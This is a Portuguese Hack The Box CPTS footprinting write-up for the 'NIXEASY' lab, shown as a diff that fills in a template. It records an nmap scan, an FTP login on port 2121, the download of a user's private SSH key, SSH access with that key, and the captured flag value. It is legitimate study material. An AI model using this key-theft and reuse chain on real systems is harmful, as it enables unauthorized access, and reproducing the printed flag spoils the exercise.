@@ -1,200 +1,205 @@
-# Footprinting Tests - Easy
+# 🏴️ Footprinting Tests - Easy
+
+> **Dificuldade:** Easy | **SO:** Linux | **Plataforma:** CPTS — Estudo de Footprinting
 
 !!! info "Sobre esta página"
-    Use esta página para registrar cada máquina ativa explorada no Hack The Box, com foco em enumeração, exploração, escalonamento de privilégios e lições aprendidas.
+    Writeup do laboratório de footprinting (máquina easy) do HackTheBox. Foco em
+    enumeração de serviços e obtenção de acesso inicial por reuso de chave SSH.
 
-## Informações gerais
+---
 
-- **Nome da máquina:**
-- **IP:**
-- **Sistema operacional:**
-- **Dificuldade:**
-- **Data de início:**
-- **Data de conclusão:**
-- **Status:** Finalizado
-- **Objetivo principal:**
-- **Tipo de máquina:**
-- **Ambiente:**
-- **Tags/Tecnologias:**
-- **Credenciais fornecidas:**
+## 📋 Informações Gerais
 
-## Enumeração inicial
+| Campo | Valor |
+|:------|:------|
+| **Hostname** | `NIXEASY` |
+| **IP** | `10.129.14.129` |
+| **SO** | Linux — Ubuntu 20.04.1 LTS |
+| **Dificuldade** | Easy |
+| **Plataforma / Módulo** | CPTS — Footprinting |
+| **Domínio interno** | `inlanefreight.htb` |
+| **Data** | 01/06/2026 |
+| **Status** | Finalizado |
 
-- [ ] Nmap rápido executado
-- [ ] Web fuzzing para descoberta de subdomínios
-- [ ] Nmap completo executado
-- [ ] Serviços identificados
-- [ ] Aplicações web verificadas
-- [ ] Diretórios/arquivos ocultos testados
-- [ ] Versões e banners registrados
-- [ ] Possíveis vulnerabilidades levantadas
+---
 
-## Resultados da enumeração
+## 🔍 Enumeração Inicial
+
+### Portas e Serviços Encontrados
+
+| Porta | Serviço | Versão / Banner |
+|:------|:--------|:----------------|
+| 21 | ftp | ProFTPD — `ftp.int.inlanefreight.htb` |
+| 22 | ssh | OpenSSH 8.2p1 Ubuntu |
+| 53 | domain | ISC BIND 9.16.1 |
+| 2121 | ftp | ProFTPD — *Ceil's FTP* |
+
+### Comando de Enumeração
+
+```bash
+sudo nmap -sS -sV --top-ports 1000 -T4 10.129.14.129
+```
+
+### Saída Relevante (evidência)
 
 ```shell
-─[us-academy-2]─[10.10.15.217]─[htb-ac-2219820@htb-zarjqkktbn]─[~]
-└──╼ [★]$ sudo nmap -sS -sV -top-ports 1000 -T4 10.129.14.129
-Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-01 15:11 EDT
-Nmap scan report for 10.129.14.129
-Host is up (0.0093s latency).
-Not shown: 996 closed tcp ports (reset)
 PORT     STATE SERVICE VERSION
 21/tcp   open  ftp?
 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
 53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
 2121/tcp open  ftp
-2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
-==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
-SF-Port21-TCP:V=7.95%I=7%D=6/1%Time=6A1DD950%P=x86_64-pc-linux-gnu%r(Gener
-SF:icLines,9C,"220\x20ProFTPD\x20Server\x20\(ftp\.int\.inlanefreight\.htb\
-SF:)\x20\[10\.129\.14\.129\]\r\n500\x20Invalid\x20command:\x20try\x20being
-SF:\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20m
-SF:ore\x20creative\r\n");
-==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
-SF-Port2121-TCP:V=7.95%I=7%D=6/1%Time=6A1DD950%P=x86_64-pc-linux-gnu%r(Gen
-SF:ericLines,8D,"220\x20ProFTPD\x20Server\x20\(Ceil's\x20FTP\)\x20\[10\.12
-SF:9\.14\.129\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20c
-SF:reative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creati
-SF:ve\r\n");
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 157.98 seconds
+# Fingerprints dos serviços nao reconhecidos:
+#  Port 21   -> 220 ProFTPD Server (ftp.int.inlanefreight.htb)
+#  Port 2121 -> 220 ProFTPD Server (Ceil's FTP)
+```
 
-### AQUI EU JA TENHO O ID_RSA QUE PEGUEI NO FTP 2121 DO CEIL ##
-─[us-academy-2]─[10.10.15.217]─[htb-ac-2219820@htb-zarjqkktbn]─[~]
-└──╼ [★]$ chmod 600 id_rsa
-┌─[us-academy-2]─[10.10.15.217]─[htb-ac-2219820@htb-zarjqkktbn]─[~]
-└──╼ [★]$ ssh -i id_rsa ceil@10.129.14.129
-Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-90-generic x86_64)
+### Descobertas
 
-  System information as of Mon 01 Jun 2026 07:38:21 PM UTC
+- [x] Servidor FTP secundário numa porta **não padrão (2121)** — "Ceil's FTP"
+- [x] Banner do FTP revela o **domínio interno** `inlanefreight.htb`
+- [x] SSH disponível (porta 22) → potencial reuso de chave
 
-  System load:  0.0               Processes:               161
-  Usage of /:   86.7% of 3.87GB   Users logged in:         0
-  Memory usage: 12%               IPv4 address for ens192: 10.129.14.129
-  Swap usage:   0%
+---
 
-Last login: Wed Nov 10 05:48:02 2021 from 10.10.14.20
-ceil@NIXEASY:~$ ls -la
-total 36
-drwxr-xr-x 4 ceil ceil 4096 Nov 10  2021 .
-drwxr-xr-x 5 root root 4096 Nov 10  2021 ..
--rw------- 1 ceil ceil  294 Nov 10  2021 .bash_history
--rw-r--r-- 1 ceil ceil  220 Nov 10  2021 .bash_logout
--rw-r--r-- 1 ceil ceil 3771 Nov 10  2021 .bashrc
-drwx------ 2 ceil ceil 4096 Nov 10  2021 .cache
--rw-r--r-- 1 ceil ceil  807 Nov 10  2021 .profile
-drwx------ 2 ceil ceil 4096 Nov 10  2021 .ssh
--rw------- 1 ceil ceil  759 Nov 10  2021 .viminfo
-ceil@NIXEASY:~$ cd /home/flag/
-ceil@NIXEASY:/home/flag$ cat flag.txt
-HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}
+## 🎯 Técnicas Utilizadas
 
-## AQUI EH EU PEGANDO A ID_RSA DO FTP 2121 CEIL ##
-──╼ [★]$ ftp ceil@10.129.14.129 2121
-Connected to 10.129.14.129.
-220 ProFTPD Server (Ceil's FTP) [10.129.14.129]
-331 Password required for ceil
-Password:
-230 User ceil logged in
-Remote system type is UNIX.
-Using binary mode to transfer files.
+| # | Técnica | Onde / Como foi aplicada |
+|:--|:--------|:-------------------------|
+| 1 | Enumeração de serviços (nmap) | Identificação do FTP na porta não padrão 2121 |
+| 2 | Acesso a FTP | Login no FTP 2121 como usuário `ceil` |
+| 3 | Exfiltração de chave privada SSH | Download de `id_rsa` de `~/.ssh/` via FTP |
+| 4 | Reuso de chave SSH | `ssh -i id_rsa ceil@alvo` → shell como `ceil` |
+| 5 | Localização da flag | Leitura de `/home/flag/flag.txt` |
+
+---
+
+## 🚀 Exploração / Acesso Inicial
+
+### Vetor de Entrada
+
+| Campo | Valor |
+|:------|:------|
+| **Vetor** | FTP (2121) → chave SSH exposta |
+| **Falha explorada** | Chave privada `id_rsa` acessível/baixável via FTP |
+| **Ferramentas** | nmap, ftp, ssh |
+| **Acesso obtido como** | `ceil` |
+
+!!! warning "Senha do FTP"
+    O login no FTP como `ceil` foi bem-sucedido (`230 User ceil logged in`), mas
+    **a senha utilizada não está registrada neste log**.
+
+### Processo
+
+```
+1. Enumerar portas → identificar FTP em 2121 (Ceil's FTP)
+2. Logar no FTP 2121 como ceil e navegar até .ssh/
+3. Baixar id_rsa (e authorized_keys, id_rsa.pub)
+4. chmod 600 id_rsa
+5. ssh -i id_rsa ceil@10.129.14.129 → shell como ceil
+```
+
+### Comandos-Chave
+
+```bash
+ftp ceil@10.129.14.129 2121
+# ftp> cd .ssh
+# ftp> get id_rsa
+# ftp> get authorized_keys
+# ftp> get id_rsa.pub
+
+chmod 600 id_rsa
+ssh -i id_rsa ceil@10.129.14.129
+```
+
+### Evidência — exfiltração da chave via FTP
+
+```shell
 ftp> cd .ssh
 250 CWD command successful
 ftp> ls
-229 Entering Extended Passive Mode (|||60808|)
-150 Opening ASCII mode data connection for file list
 -rw-rw-r--   1 ceil     ceil          738 Nov 10  2021 authorized_keys
 -rw-------   1 ceil     ceil         3381 Nov 10  2021 id_rsa
 -rw-r--r--   1 ceil     ceil          738 Nov 10  2021 id_rsa.pub
-226 Transfer complete
 ftp> get id_rsa
 local: id_rsa remote: id_rsa
-229 Entering Extended Passive Mode (|||62465|)
 150 Opening BINARY mode data connection for id_rsa (3381 bytes)
-100% |***********************************|  3381        2.86 MiB/s    00:00 ETA
 226 Transfer complete
 3381 bytes received in 00:00 (405.52 KiB/s)
-ftp>
 ```
 
-Portas abertas: 21 (ftp), 22 (ssh), 53 (dns) e 2121 (ftp? Ceil's FTP).
+### Tentativas que NÃO funcionaram
 
-## Exploração inicial
+- `nano` / `vi` / `vim authorized_keys` **dentro do cliente FTP** → `?Invalid command.`
+- `cd .profile` e `cd authorized_keys` → `550 ...: Not a directory`
 
-- **Vetor escolhido:**
-- **Falhas exploradas:**
-- **Ferramentas usadas:**
-- **Acesso inicial obtido como:**
-- **Observações:**
+!!! tip "Lição"
+    O cliente FTP interativo não edita arquivos remotos — só transfere. O caminho
+    correto é `get` o arquivo e abri-lo localmente.
 
-```bash
-# Comandos principais da exploração
-smbclient -L //192.168.100.69 -N
+---
+
+## 🐚 Shell e Pós-Acesso
+
+Acesso obtido como `ceil` via SSH com a chave exfiltrada (Ubuntu 20.04.1 LTS).
+
+### Usuários encontrados (`/home`)
+
+| Usuário | Observação |
+|:--------|:-----------|
+| `ceil` | usuário acessado |
+| `cry0l1t3` | presente em `/home` |
+| `flag` | diretório que contém a flag |
+
+### Credenciais / Chaves Encontradas
+
+| Tipo | Valor / Local |
+|:-----|:--------------|
+| Chave SSH privada | `id_rsa` baixado de `~/.ssh/` do `ceil` via FTP 2121 |
+
+### Evidência — acesso SSH e flag
+
+```shell
+└──╼ [★]$ chmod 600 id_rsa
+└──╼ [★]$ ssh -i id_rsa ceil@10.129.14.129
+Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-90-generic x86_64)
+Last login: Wed Nov 10 05:48:02 2021 from 10.10.14.20
+
+ceil@NIXEASY:~$ cd /home/flag/
+ceil@NIXEASY:/home/flag$ cat flag.txt
+HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}
 ```
 
-## Shell e estabilização
+---
 
-- [ ] Reverse shell obtida
-- [ ] Shell estabilizada
-- [ ] Usuário identificado
-- [ ] Ambiente validado
+## 🚩 Flags
 
-```bash
-# Comandos para estabilização da shell
-```
+- [x] Flag capturada
 
-## Enumeração pós-exploração
+| Flag | Local |
+|:-----|:------|
+| `HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}` | `/home/flag/flag.txt` |
 
-- **Usuários encontrados:**
-- **Arquivos sensíveis:**
-- **Permissões incomuns:**
-- **Serviços internos relevantes:**
-- **Credenciais ou hashes localizados:**
+!!! note
+    A flag foi obtida em `/home/flag/`. Não houve acesso a `/root` neste log —
+    portanto **não há root flag** registrada.
 
-```bash
-# LinPEAS / LinEnum / enumeração manual
-```
+---
 
-## Escalonamento de privilégios
+## 📖 Resumo Técnico
 
-- **Vetores identificados:**
-- **Técnica utilizada:**
-- **Resultado:**
-- **Acesso root/administrator:**
+| Campo | Valor |
+|:------|:------|
+| **Causa raiz** | Chave privada SSH exposta através de um serviço FTP acessível |
+| **Cadeia de ataque** | Enumeração (nmap) → FTP 2121 como `ceil` → download de `id_rsa` → SSH como `ceil` → flag em `/home/flag/` |
+| **Acesso final** | `ceil` (usuário) |
 
-```bash
-# Comandos de privilege escalation
-```
+---
 
-## Flags
+## 💡 Lições Aprendidas
 
-- [ ] User flag capturada
-- [ ] Root/Admin flag capturada
-- **User flag:**
-- **Root/Admin flag:**
-
-## Evidências
-
-- Adicione aqui prints, trechos de saída, links e observações importantes.
-
-## Resumo técnico
-
-- **Causa raiz da exploração:**
-- **Cadeia de ataque resumida:**
-- **Pontos que mais exigiram atenção:**
-
-## Lições aprendidas
-
-- **O que funcionou bem:**
-- **O que atrasou a exploração:**
-- **Comandos para revisar depois:**
-- **Técnicas para estudar melhor:**
-
-## Próximos passos
-
-- [ ] Revisar exploração manual
-- [ ] Reproduzir sem anotações
-- [ ] Documentar writeup pessoal
-- [ ] Relacionar técnicas com módulos CPTS
+- **O que funcionou:** reuso da `id_rsa` exfiltrada do FTP para autenticar via SSH.
+- **O que atrasou:** tentar editar arquivos dentro do cliente FTP (`nano`/`vi`/`vim`) — não suportado.
+- **Comandos para revisar depois:** enumeração de serviços em **portas altas/não padrão** (o FTP relevante estava na 2121, não na 21).
+- **Técnicas para estudar melhor:** após obter qualquer acesso a arquivos, sempre conferir `~/.ssh/` por chaves privadas legíveis.
